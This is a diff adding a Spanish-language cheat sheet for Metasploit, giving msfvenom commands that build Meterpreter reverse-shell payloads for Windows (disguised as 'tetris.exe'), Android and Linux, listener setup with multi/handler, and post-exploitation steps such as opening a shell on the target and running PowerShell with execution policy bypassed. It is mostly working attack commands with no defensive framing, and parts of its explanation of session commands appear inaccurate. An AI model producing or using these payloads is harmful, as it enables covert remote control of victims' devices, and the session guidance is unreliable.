@@ -1,0 +1,102 @@
+----------->crear el archivo que realiza la infeccion
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="172.20.119.38" LPORT=4444 -f exe -o tetris.exe
+------------------------------------------------>
+-------------------------Poner en escucha y espera de la app
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 172.20.119.38
+set LPORT 4444
+show options
+exploit
+
+
+--------------------->android
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=IP_DEL_ATACANTE LPORT=PUERTO -o app.apk
+
+
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST IP_DEL_ATACANTE
+set LPORT PUERTO
+show options
+exploit
+
+---------------------->Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP_DEL_ATACANTE LPORT=PUERTO -f elf -o payload.elf
+
+
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST IP_DEL_ATACANTE
+set LPORT PUERTO
+show options
+exploit
+---------------------------------------------------------------------------------------------->
+
+
+Crear un script con Metasploit
+Puedes utilizar la función post/windows/manage/powershell/exec_powershell de Metasploit para ejecutar comandos PowerShell en el sistema objetivo y, por lo tanto, crear y ejecutar un script. Aquí tienes un ejemplo:
+
+
+meterpreter > run post/windows/manage/powershell/exec_powershell -Command "Write-Host 'Hello from Metasploit'" -i
+
+
+En el comando anterior, run ejecuta el módulo exec_powershell y le pasa un comando PowerShell para crear un script y ejecutarlo. Puedes personalizar el comando para hacer lo que necesites.
+
+Crear y ejecutar un script personalizado
+Si deseas crear y ejecutar un script personalizado directamente en el dispositivo objetivo, puedes utilizar las capacidades de scripting del propio sistema operativo o un lenguaje de scripting compatible con el sistema. Por ejemplo, en Linux, puedes usar Bash o Python, mientras que en Windows, puedes usar PowerShell o Batch. Para crear un script personalizado, puedes abrir una sesión de shell en el dispositivo objetivo utilizando el comando shell.
+
+Ejemplo en Linux (Bash):
+
+bash
+Copy code
+meterpreter > shell
+Process 7385 created.
+Channel 1 created.
+pwd
+ls
+echo 'echo "Hello from my_script.sh"' > my_script.sh
+chmod +x my_script.sh
+./my_script.sh
+exit
+Este ejemplo abre una sesión de shell, crea un archivo de script llamado my_script.sh, le da permisos de ejecución y luego lo ejecuta.
+
+Ejemplo en Windows (PowerShell):
+
+bash
+Copy code
+
+
+meterpreter > shell
+Process 7385 created.
+Channel 1 created.
+cd C:\Users\Usuario\Documentos
+echo 'Write-Host "Hello from my_script.ps1"' > my_script.ps1
+powershell -ExecutionPolicy Bypass -File my_script.ps1
+exit
+
+Este ejemplo abre una sesión de shell, crea un archivo de script de PowerShell llamado my_script.ps1, y luego lo ejecuta.
+
+---------------------------------------------------------------------------------->
+
+En la sesión Meterpreter que deseas guardar, ejecuta el comando sessions -s seguido del número de sesión que deseas guardar. Por ejemplo:
+
+Copy code
+meterpreter > sessions -s NUMERO_DE_SESION
+Esto guardará la sesión en el sistema local en la máquina que está ejecutando Metasploit.
+
+Para verificar que la sesión se ha guardado correctamente, puedes utilizar el comando sessions -l para listar todas las sesiones guardadas:
+
+Copy code
+meterpreter > sessions -l
+Esto mostrará una lista de todas las sesiones guardadas en tu sistema local.
+
+Para restaurar una sesión guardada en futuras sesiones de Metasploit, puedes utilizar el comando sessions -i seguido del número de sesión guardada. Por ejemplo:
+
+css
+Copy code
+meterpreter > sessions -i NUMERO_DE_SESION_GUARDADA
+Esto te permitirá acceder a la sesión guardada y continuar interactuando con el sistema comprometido.
+_----------------------------------------------------------------------------------------------------------->
+
